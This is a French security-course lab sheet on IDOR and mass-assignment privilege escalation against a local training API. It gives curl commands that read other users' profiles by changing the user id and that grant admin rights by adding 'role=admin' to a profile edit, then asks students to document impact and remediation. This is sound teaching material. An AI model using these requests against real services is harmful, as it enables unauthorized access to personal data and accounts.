# TP3 — IDOR et Privilege Escalation

## Objectif

Tester un contrôle d’accès insuffisant.

## Partie A — IDOR

Connectez-vous :

```bash
curl -i -c cookies.txt -X POST http://authapi.target.local:5001/login \
  -d "username=alice&password=alice123"
```

Votre utilisateur est `alice`, id `1`.

Tester votre profil :

```bash
curl -b cookies.txt http://authapi.target.local:5001/api/users/1/profile | jq
```

Tester un autre utilisateur :

```bash
curl -b cookies.txt http://authapi.target.local:5001/api/users/2/profile | jq
curl -b cookies.txt http://authapi.target.local:5001/api/users/3/profile | jq
```

## Partie B — Privilege escalation par mass assignment

Vérifier votre profil :

```bash
curl -b cookies.txt http://authapi.target.local:5001/me | jq
```

Modifier l’email uniquement :

```bash
curl -b cookies.txt -X POST http://authapi.target.local:5001/api/user/edit \
  -d "email=alice2@target.local" | jq
```

Tester l’ajout d’un champ sensible :

```bash
curl -b cookies.txt -X POST http://authapi.target.local:5001/api/user/edit \
  -d "email=alice2@target.local&role=admin" | jq
```

Revérifier :

```bash
curl -b cookies.txt http://authapi.target.local:5001/me | jq
```

## À documenter

- endpoint vulnérable ;
- contrôle manquant ;
- données exposées ;
- impact ;
- remédiation.

## Livrable

```bash
cp ../livrables-templates/03-idor-privilege-escalation.md livrables/03-idor-privilege-escalation.md
```
